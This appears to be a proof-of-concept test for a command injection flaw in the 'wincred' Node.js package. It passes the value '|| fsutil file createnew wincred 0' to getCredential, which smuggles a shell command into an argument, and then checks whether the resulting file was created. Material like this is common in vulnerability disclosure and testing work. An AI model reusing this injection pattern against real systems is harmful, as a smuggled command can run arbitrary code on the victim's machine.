// test("Command Injection in wincred", () => {
//   expect.assertions(2);
  const wincred = require("wincred");
  const fs = require("fs");
  const path = "./wincred";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  return wincred.getCredential("|| fsutil file createnew wincred 0").finally(() => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, () => {});
  });
// });
